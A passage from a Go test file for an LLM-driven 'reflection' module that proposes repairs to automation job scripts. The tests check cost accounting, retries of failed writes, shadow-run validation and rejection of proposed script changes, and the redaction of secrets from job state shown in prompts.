	m := newModule(db, nil, nil, runner.JobConfig{})
	published, unsubscribe := m.deps.Bus.Subscribe(events.WorkspaceTopic(wid))
	defer unsubscribe()
	runID := database.NewID()
	testutil.Exec(t, db, `INSERT INTO runs (id, workspace_id, job_id, number, status, mode, trigger, playbook_version, queued_at, reflection, reflection_requested_at) VALUES ($1, $2, $3, 1, 'succeeded', 'assisted', 'manual', 0, 1, 'pending', 200)`,
		runID, wid, jobID)
	state := func() (string, int64, int64) {
		var reflection string
		var cost, tokens int64
		require.NoError(t, db.QueryRowContext(ctx, `SELECT reflection, reflection_cost, reflection_tokens FROM runs WHERE id = $1`, runID).Scan(&reflection, &cost, &tokens))
		return reflection, cost, tokens
	}

	// The reflection requested at 100 was given up on, and the one requested at 200 is still running
	m.finish(ctx, wid, jobID, runID, new(int64(100)), result{Status: StatusDone, Cost: 5, Tokens: 500})
	reflection, cost, tokens := state()
	assert.Equal(t, StatusPending, reflection)
	assert.EqualValues(t, 5, cost)
	assert.EqualValues(t, 500, tokens)
	assert.Empty(t, published)

	// A free model costs nothing, but its tokens still count
	m.finish(ctx, wid, jobID, runID, new(int64(200)), result{Status: StatusDone, Tokens: 700})
	reflection, cost, tokens = state()
	assert.Equal(t, StatusDone, reflection)
	assert.EqualValues(t, 5, cost)
	assert.EqualValues(t, 1200, tokens)
	assert.Len(t, published, 1)
}

func TestReflectionResultSurvivesAFailedWrite(t *testing.T) {
	ctx := t.Context()
	db := testutil.NewDatabaseForTest(t)
	if db.Engine() != database.EngineSQLite {
		t.Skip("the failed write is staged with a SQLite trigger")
	}
	delay := finishRetryDelay
	finishRetryDelay = 500 * time.Millisecond
	t.Cleanup(func() { finishRetryDelay = delay })
	wid := testutil.SeedWorkspace(t, db)
	jobID := testutil.SeedJob(t, db, wid, "skip")
	m := newModule(db, nil, nil, runner.JobConfig{})
	runID := seedRun(t, db, wid, jobID, 1, runner.ModeAssisted, 0)

	// The database refuses reflection results for a moment, like one that briefly drops connections
	until := time.Now().Add(200 * time.Millisecond).UnixMilli()
	testutil.Exec(t, db, fmt.Sprintf(`CREATE TRIGGER refuse_results BEFORE UPDATE OF reflection ON runs
		WHEN (julianday('now') - 2440587.5) * 86400000 < %d BEGIN SELECT RAISE(ABORT, 'database unavailable'); END`, until))

	// The result is recorded once the database is back, and the spend the failed write added counts only once
	m.finish(ctx, wid, jobID, runID, nil, result{Status: StatusDone, Summary: "Learned something", Cost: 5, Tokens: 500})
	var reflection string
	var cost, tokens int64
	require.NoError(t, db.QueryRowContext(ctx, `SELECT reflection, reflection_cost, reflection_tokens FROM runs WHERE id = $1`, runID).Scan(&reflection, &cost, &tokens))
	assert.Equal(t, StatusDone, reflection)
	assert.EqualValues(t, 5, cost)
	assert.EqualValues(t, 500, tokens)
}

// fakeTester answers shadow runs in order and remembers what it was asked to run
type fakeTester struct {
	results []runner.ShadowResult
	mains   []string
	inputs  []string
}

func (f *fakeTester) Shadow(_ context.Context, run runner.Run, job runner.JobConfig) (runner.ShadowResult, error) {
	f.mains = append(f.mains, job.Main)
	f.inputs = append(f.inputs, string(run.Input))
	if len(f.results) == 0 {
		return runner.ShadowResult{}, errors.New("no shadow result scripted")
	}
	res := f.results[0]
	f.results = f.results[1:]
	return res, nil
}

// graduatedJob seeds a job whose main script fell back in its latest run, which reflection is about to repair
func graduatedJob(t *testing.T, db *database.DB) (wid, jobID, runID string, pb *playbook.Module) {
	t.Helper()
	ctx := t.Context()
	wid = testutil.SeedWorkspace(t, db)
	jobID = testutil.SeedJob(t, db, wid, "skip")
	pb = playbook.New(playbook.Dependencies{DB: db})
	main := "#!/usr/bin/env bash\n/ump/toolkit/latest_mp3 --channel \"$(jq -r .channel_url /ump/input.json)\"\n"
	_, err := pb.Save(ctx, wid, jobID, playbook.Content{Main: &main, Verify: json.RawMessage(`{"checks":["exit_code == 0"],"llm":false}`)}, playbook.VersionMeta{Author: playbook.AuthorUser})
	require.NoError(t, err)
	runID = database.NewID()
	testutil.Exec(t, db, `INSERT INTO runs (id, workspace_id, job_id, number, status, mode, fell_back, trigger, input, outputs, playbook_version, queued_at, finished_at, turns, reflection, reflection_requested_at)
		VALUES ($1, $2, $3, 4, 'succeeded', 'scripted', TRUE, 'manual', $4, $5, 1, $6, $6, 2, 'pending', $6)`,
		runID, wid, jobID, `{"channel_url":"https://www.youtube.com/@someone"}`, `{"video_id":"new-video","mp3_size_bytes":10}`, database.Now())
	return wid, jobID, runID, pb
}

var mp3Job = runner.JobConfig{
	Instruction: "Download the latest video of the channel as MP3", BaseImage: "sandbox:latest", ModelID: "m1",
	Inputs: []string{"channel_url (string): YouTube channel URL"}, InputNames: []string{"channel_url"},
	Outputs: []string{"video_id (string)", "mp3_size_bytes (integer)"}, OutputNames: []string{"video_id", "mp3_size_bytes"},
	Graduate: true,
}

func TestReflectLeavesMainAloneWhenGraduationIsOff(t *testing.T) {
	ctx := t.Context()
	db := testutil.NewDatabaseForTest(t)
	wid, jobID, runID, pb := graduatedJob(t, db)
	_, before, err := pb.Current(ctx, jobID)
	require.NoError(t, err)

	// The model is told not to touch main, and a repair it proposes anyway is rejected without a shadow run
	repair := map[string]any{"summary": "Repaired main", "usedLearnings": []string{}, "ops": []any{
		op(playbook.OpUpdateMain, map[string]any{"content": "#!/usr/bin/env bash\necho repaired\n"}),
		op(playbook.OpAddLearning, map[string]any{"text": "Shorts count as uploads"}),
	}}
	provider := fake.New()
	provider.Enqueue(submit(t, repair), submit(t, repair))
	job := mp3Job
	job.Graduate = false
	m := newModule(db, pb, provider, job)
	tester := &fakeTester{}
	m.tester = tester
	res := reflectOn(t, m, wid, runID)

	assert.Contains(t, provider.Requests()[0].Messages[0].Text(), "Graduation is turned off for this job")
	assert.Empty(t, tester.mains)
	require.NotEmpty(t, res.Ops)
	assert.Equal(t, playbook.OpRejected, res.Ops[0].Status)
	assert.Contains(t, res.Ops[0].Reason, "graduation is turned off")
	_, after, err := pb.Current(ctx, jobID)
	require.NoError(t, err)
	assert.Equal(t, *before.Main, *after.Main)
}

func TestReflectTriesARepairedMainInAShadowRunFirst(t *testing.T) {
	ctx := t.Context()
	db := testutil.NewDatabaseForTest(t)
	wid, jobID, runID, pb := graduatedJob(t, db)

	// The first repair picks the wrong video, which only comparing its outputs with the run's reveals
	wrong := "#!/usr/bin/env bash\n# picks the oldest upload\n/ump/toolkit/latest_mp3 --oldest --channel \"$(jq -r .channel_url /ump/input.json)\"\n"
	fixed := "#!/usr/bin/env bash\n/ump/toolkit/latest_mp3 --tab videos --channel \"$(jq -r .channel_url /ump/input.json)\"\n"
	provider := fake.New()
	provider.Enqueue(
		submit(t, map[string]any{"summary": "Repaired main", "usedLearnings": []string{}, "ops": []any{
			op(playbook.OpUpdateMain, map[string]any{"content": wrong}),
			op(playbook.OpAddLearning, map[string]any{"text": "Shorts count as uploads"}),
		}}),
		submit(t, map[string]any{"summary": "Repaired main", "usedLearnings": []string{}, "ops": []any{
			op(playbook.OpUpdateMain, map[string]any{"content": fixed}),
			op(playbook.OpAddLearning, map[string]any{"text": "Shorts count as uploads"}),
		}}),
	)
	tester := &fakeTester{results: []runner.ShadowResult{
		{Passed: true, Outputs: map[string]json.RawMessage{"video_id": json.RawMessage(`"old-video"`), "mp3_size_bytes": json.RawMessage(`10`)}, Output: "selected old-video", Cost: 700, Tokens: 7000},
		{Passed: true, Outputs: map[string]json.RawMessage{"video_id": json.RawMessage(`"new-video"`), "mp3_size_bytes": json.RawMessage(`10.0`)}, Cost: 300, Tokens: 3000},
	}}
	m := newModule(db, pb, provider, mp3Job)
	m.tester = tester
	res := reflectOn(t, m, wid, runID)

	// The model saw the declared input and the run's value of it
	requests := provider.Requests()
	require.Len(t, requests, 2)
	first := requests[0].Messages[0].Text()
	assert.Contains(t, first, "- input: channel_url (string): YouTube channel URL")
	assert.Contains(t, first, `Input: {"channel_url":"https://www.youtube.com/@someone"}`)

	// Both proposals ran with the run's input, and the second request explained the mismatch with main's output
	assert.Equal(t, []string{wrong, fixed}, tester.mains)
	assert.Equal(t, []string{`{"channel_url":"https://www.youtube.com/@someone"}`, `{"channel_url":"https://www.youtube.com/@someone"}`}, tester.inputs)
	feedback := requests[1].Messages[len(requests[1].Messages)-1].Text()
	assert.Contains(t, feedback, `main reported the output video_id as "old-video", but run #4 reported "new-video"`)
	assert.Contains(t, feedback, "selected old-video")

	// Only the repair that reproduced the run became main, and the shadow runs' cost counts toward reflection
	require.NotNil(t, res.Version)
	require.Len(t, res.Ops, 2)
	assert.Equal(t, playbook.OpApplied, res.Ops[0].Status)
	require.NotNil(t, res.Ops[0].Test)
	assert.Equal(t, playbook.TestPassed, res.Ops[0].Test.Status)
	assert.Contains(t, res.Ops[0].Test.Detail, "outputs matched")
	assert.Nil(t, res.Ops[1].Test)
	assert.Equal(t, int64(2*(1000+1000)+700+300), res.Cost)
	assert.Equal(t, int64(2*(1000+500)+7000+3000), res.Tokens)
	_, content, err := pb.Current(ctx, jobID)
	require.NoError(t, err)
	assert.Equal(t, fixed, *content.Main)
}

func TestAMainThatFailsItsShadowRunIsRejectedWithWhatItDependsOn(t *testing.T) {
	ctx := t.Context()
	db := testutil.NewDatabaseForTest(t)
	wid, jobID, runID, pb := graduatedJob(t, db)
	_, before, err := pb.Current(ctx, jobID)
	require.NoError(t, err)

	// Both answers break main, so neither main nor its new checks apply, while the learning still does
	broken := map[string]any{"summary": "Repaired main", "usedLearnings": []string{}, "ops": []any{
		op(playbook.OpUpdateMain, map[string]any{"content": "#!/usr/bin/env bash\ncat /ump/input.json\nexit 3\n"}),
		op(playbook.OpSetVerify, map[string]any{"content": `{"checks":["output.video_id exists"],"llm":false}`}),
		op(playbook.OpAddLearning, map[string]any{"text": "Shorts count as uploads"}),
	}}
	provider := fake.New()
	provider.Enqueue(submit(t, broken), submit(t, broken))
	failed := runner.ShadowResult{Reason: `the check "exit_code == 0" failed: exit code was 3`, Output: "exit code: 3"}
	m := newModule(db, pb, provider, mp3Job)
	m.tester = &fakeTester{results: []runner.ShadowResult{failed, failed}}
	res := reflectOn(t, m, wid, runID)

	require.Len(t, res.Ops, 3)
	assert.Equal(t, []string{playbook.OpRejected, playbook.OpRejected, playbook.OpApplied}, []string{res.Ops[0].Status, res.Ops[1].Status, res.Ops[2].Status})
	assert.Contains(t, res.Ops[0].Reason, "main failed its shadow run: the check")
	require.NotNil(t, res.Ops[0].Test)
	assert.Equal(t, playbook.TestFailed, res.Ops[0].Test.Status)
	assert.Equal(t, "exit code: 3", res.Ops[0].Test.Output)
	assert.Contains(t, res.Ops[1].Reason, "with these changes")

	_, content, err := pb.Current(ctx, jobID)
	require.NoError(t, err)
	assert.Equal(t, *before.Main, *content.Main)
	assert.JSONEq(t, string(before.Verify), string(content.Verify))
	assert.Len(t, content.Learnings, 1)
}

func TestShadowRunsOnlyWhenTheyCantRepeatAnything(t *testing.T) {
	repair := "#!/usr/bin/env bash\n/ump/toolkit/latest_mp3 --tab videos --channel \"$(jq -r .channel_url /ump/input.json)\"\n"
	cases := []struct {
		name    string
		job     func(j *runner.JobConfig)
		prepare func(t *testing.T, db *database.DB, runID string)
		verify  string
		skipped string
		passed  string
	}{
		{name: "side effects", job: func(j *runner.JobConfig) { j.SideEffects = []string{"Posts to Slack"} }, skipped: "The job has side effects (Posts to Slack)"},
		{name: "state", prepare: func(t *testing.T, db *database.DB, runID string) {
			testutil.Exec(t, db, `INSERT INTO run_events (run_id, seq, ts, type, payload) VALUES ($1, 1, 1, 'broker.call', '{"endpoint":"PUT /v1/state/last_video","ok":true}')`, runID)
		}, skipped: "changed the job's state"},
		{name: "varying outputs", verify: `{"checks":[],"llm":false,"varies":["video_id","mp3_size_bytes"]}`, passed: "were not compared"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			db := testutil.NewDatabaseForTest(t)
			wid, _, runID, pb := graduatedJob(t, db)
			if tc.prepare != nil {
				tc.prepare(t, db, runID)
			}
			job := mp3Job
			if tc.job != nil {
				tc.job(&job)
			}
			ops := []any{op(playbook.OpUpdateMain, map[string]any{"content": repair})}
			if tc.verify != "" {
				ops = append(ops, op(playbook.OpSetVerify, map[string]any{"content": tc.verify}))
			}
			provider := fake.New()
			provider.Enqueue(submit(t, map[string]any{"summary": "Repaired main", "usedLearnings": []string{}, "ops": ops}))
			tester := &fakeTester{results: []runner.ShadowResult{{Passed: true, Outputs: map[string]json.RawMessage{"video_id": json.RawMessage(`"other"`)}}}}
			m := newModule(db, pb, provider, job)
			m.tester = tester
			res := reflectOn(t, m, wid, runID)

			// The repair applies either way, and its test says what happened
			require.Equal(t, playbook.OpApplied, res.Ops[0].Status, res.Ops[0].Reason)
			require.NotNil(t, res.Ops[0].Test)
			if tc.skipped != "" {
				assert.Empty(t, tester.mains)
				assert.Equal(t, playbook.TestSkipped, res.Ops[0].Test.Status)
				assert.Contains(t, res.Ops[0].Test.Detail, tc.skipped)
				return
			}
			assert.Len(t, tester.mains, 1)
			assert.Equal(t, playbook.TestPassed, res.Ops[0].Test.Status)
			assert.Contains(t, res.Ops[0].Test.Detail, tc.passed)
		})
	}
}

// fakeStates serves one fixed state for every job
type fakeStates map[string]string

func (f fakeStates) ForJob(string) runner.JobState { return fakeState(f) }

type fakeState map[string]string

func (f fakeState) Get(_ context.Context, key string) (string, bool, error) {
	v, ok := f[key]
	return v, ok, nil
}
func (f fakeState) Set(context.Context, string, string) error { return nil }
func (f fakeState) List(context.Context) (map[string]string, error) {
	return f, nil
}

func TestReflectionSeesTheJobState(t *testing.T) {
	// Values are redacted before they are cut short, and the keys reach the prompt sorted
	m := &Module{deps: Dependencies{State: fakeStates{
		"seen_ids":  `["a", "b"]`,
		"api_reply": "token=s3cret " + strings.Repeat("x", 300),
	}}}
	state := m.statePreview(context.Background(), "job", newRedactor(map[string]string{"TOKEN": "s3cret"}))
	assert.Equal(t, `["a", "b"]`, state["seen_ids"])
	assert.NotContains(t, state["api_reply"], "s3cret")
	assert.Contains(t, state["api_reply"], "… (")

	msg := input{State: state}.userMessage()
	assert.Contains(t, msg, "\n## Job state\n- api_reply: ")
	assert.Contains(t, msg, "\n- seen_ids: [\"a\", \"b\"]\n")

	// A job without state, or a reflection without a state reader, leaves the section out
	assert.NotContains(t, input{}.userMessage(), "## Job state")
	assert.Nil(t, (&Module{}).statePreview(context.Background(), "job", newRedactor(nil)))
}
